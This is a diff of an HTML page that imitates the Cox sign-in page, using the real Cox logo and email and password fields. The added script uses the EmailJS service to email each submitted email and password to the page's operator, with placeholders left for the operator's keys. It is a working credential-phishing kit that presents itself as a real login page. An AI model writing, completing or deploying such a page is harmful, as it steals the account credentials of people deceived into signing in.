@@ -4,137 +4,140 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Cox Login</title>
-<!-- Font Awesome icons (for icons similar to Cox) -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
-
+<!-- EmailJS SDK -->
+<script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
 <style>
-  body {
-    margin: 0;
-    height: 100vh;
+  * {
+    box-sizing: border-box;
+  }
+  body, html {
+    margin: 0; padding: 0; height: 100%;
     font-family: Arial, sans-serif;
+  }
+  .header {
+    height: 60px;
+    background-color: #ffffff;
+    border-bottom: 1px solid #e0e0e0;
     display: flex;
-    justify-content: center;
     align-items: center;
-    background-image: url('YOUR_CUSTOM_IMAGE_URL'); /* Replace with your image */
-    background-size: cover;
-    background-position: center;
+    padding: 0 2rem;
   }
-
-  .login-box {
-    width: 400px;
-    background: rgba(255, 255, 255, 0.9);
-    padding: 30px;
-    border-radius: 10px;
-    box-shadow: 0 0 20px rgba(0,0,0,0.3);
-    text-align: center;
+  .header img {
+    height: 30px;
   }
-
-  .logo {
-    margin-bottom: 20px;
+  .container {
+    display: flex;
+    height: calc(100% - 60px); /* full height minus header */
   }
-
-  .logo img {
-    width: 150px;
+  .left-panel {
+    width: 440px;
+    background-color: white;
+    padding: 50px 40px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
   }
-
-  h2 {
-    font-size: 24px;
-    margin-bottom: 10px;
+  .left-panel h1 {
+    margin: 0 0 15px 0;
+    font-weight: 600;
+    font-size: 28px;
     color: #002b45;
   }
-
-  p {
-    font-size: 14px;
-    margin-bottom: 20px;
-    color: #333;
+  .left-panel p {
+    margin: 0 0 30px 0;
+    font-size: 16px;
+    color: #535353;
   }
-
   form {
     display: flex;
     flex-direction: column;
   }
-
   label {
-    text-align: left;
-    font-weight: bold;
-    margin-bottom: 5px;
     font-size: 14px;
+    margin-bottom: 6px;
     color: #004263;
   }
-
-  input[type=email], input[type=password] {
-    padding: 10px;
-    margin-bottom: 15px;
+  input[type="email"],
+  input[type="password"] {
+    height: 40px;
+    margin-bottom: 20px;
+    padding: 0 12px;
     border: 1px solid #cbd1d8;
     border-radius: 4px;
-    font-size: 14px;
-  }
-
-  button {
-    padding: 12px;
-    background-color: #0078d2;
-    color: #fff;
-    border: none;
-    border-radius: 4px;
     font-size: 16px;
-    cursor: pointer;
   }
-
+  button {
+    height: 44px;
+    background-color: #0078d2;
+    border: none;
+    color: white;
+    font-size: 16px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-weight: 600;
+  }
   button:hover {
     background-color: #005ea3;
   }
-
-  .forgot {
-    margin-top: 10px;
-    font-size: 13px;
+  .forgot-password {
+    margin-top: 12px;
+    font-size: 14px;
+    color: #0078d2;
     text-align: right;
+    cursor: pointer;
   }
-
-  .forgot a {
-    color: #0078d2;
-    text-decoration: none;
-  }
-
-  .footer {
-    margin-top: 25px;
-    font-size: 13px;
-  }
-
-  .footer a {
-    color: #0078d2;
-    text-decoration: none;
-    font-weight: bold;
+  .right-panel {
+    flex: 1;
+    background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=800&q=80') no-repeat center center/cover;
   }
 </style>
 </head>
 <body>
 
-<div class="login-box">
-  <div class="logo">
-    <img src="https://via.placeholder.com/150x50?text=Cox" alt="Cox Logo" />
-  </div>
-  <h2>Sign In</h2>
-  <p>Sign in to your Cox account to access your services</p>
-  <form>
-    <label for="email">Email or Phone Number</label>
-    <input type="email" id="email" placeholder="Email or Phone Number" required />
-
-    <label for="password">Password</label>
-    <input type="password" id="password" placeholder="Password" required />
-
-    <button type="submit">Sign In</button>
-    
-    <div class="forgot">
-      <a href="#">Forgot password?</a>
-    </div>
-  </form>
-  
-  <div class="footer">
-    <p>Don't have an account? <a href="#">Register now</a></p>
-  </div>
+<div class="header">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Cox_logo_2017.svg" alt="Cox Logo" />
 </div>
 
-<!-- Optional: include your EmailJS code here if needed -->
+<div class="container">
+  <div class="left-panel">
+    <h1>Sign In</h1>
+    <p>Access your Cox account to manage services and billing.</p>
+    <form id="signin-form">
+      <label for="user_email">Email or Phone Number</label>
+      <input type="email" id="user_email" name="user_email" placeholder="Enter your email or phone" required />
+
+      <label for="user_password">Password</label>
+      <input type="password" id="user_password" name="user_password" placeholder="Enter your password" required />
+
+      <button type="submit">Sign In</button>
+      <div class="forgot-password"><a href="#">Forgot Password?</a></div>
+    </form>
+  </div>
+  <div class="right-panel"></div>
+</div>
+
+<script>
+  // Initialize EmailJS with your user ID
+  (function(){
+    emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
+  })();
+
+  const form = document.getElementById('signin-form');
+  form.addEventListener('submit', function(event) {
+    event.preventDefault();
+    const templateParams = {
+      user_email: form.user_email.value,
+      user_password: form.user_password.value
+    };
+    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+      .then(() => {
+        alert('Sign-in information sent successfully!');
+        form.reset();
+      }, () => {
+        alert('Failed to send the sign-in information. Please try again.');
+      });
+  });
+</script>
 
 </body>
 </html>
